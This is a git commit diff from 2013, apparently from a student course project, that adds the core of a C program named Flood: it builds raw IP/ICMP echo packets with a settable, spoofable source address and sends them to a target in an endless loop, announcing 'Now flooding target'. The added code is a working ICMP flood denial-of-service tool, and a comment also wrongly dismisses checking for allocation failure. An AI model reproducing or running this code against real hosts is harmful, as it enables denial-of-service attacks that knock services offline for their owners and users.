995e825787dd1f65a92db41e0b3760adb6399d0a
DeadDingo <thedeaddingo@gmail.com>
2013-12-10 20:27:23 -0800

    Flood Update

--- cscd240/Flood/main.c
+++ cscd240/Flood/main.c
@@ -72,5 +72,65 @@ int main(int argc, char *argv[]) {
   }
 
   //calc packet size
+  int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
+  char *packet = (char *) malloc(packet_size);
+
+  //no need to test for out of memory error on modern system
+
+  //ip header
+  struct iphdr *ip = (struct iphdr *) packet;
+  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
+
+  //zero out the packet buffer
+  memset(packet, 0, packet_size);
+
+  //set member variables
+  ip->version = 4;
+  ip->ihl = 5;
+  ip->tos = 0;
+  ip->tot_len = htons(packet_size);
+  ip->id = rand();
+  ip->frag_off = 0;
+  ip->ttl = 225;
+  ip->protocol = IPPROTO_ICMP;
+  ip->saddr = source;
+  ip->daddr = dest;
+
+  icmp->type = ICMP_ECHO;
+  icmp->code = 0;
+  icmp->un.echo.sequence = rand();
+  icmp->un.echo.id = rand();
+  icmp->checksum = 0;
+
+  struct sockaddr_in servaddr;
+  servaddr.sin_family = AF_INET;
+  servaddr.sin_addr.s_addr = dest;
+  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));
+
+  puts("Now flooding target");
+
+  while (1) {
+
+    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
+    icmp->checksum = 0;
+    icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
+
+    if( (sent_size = sendto(lsocket, packet, packet_size, 0, (struct sockaddr *) &servaddr, sizeof(servaddr))) < 1) {
+      perror("Packet Send Failed");
+      break;
+    }
+
+    ++sent;
+    printf("%d packets sent\r", sent);
+    fflush(stdout);
+
+    usleep(10000);
+
+  }
+
+  free(packet);
+  close(lsocket);
+
+  return 0;
 
 }
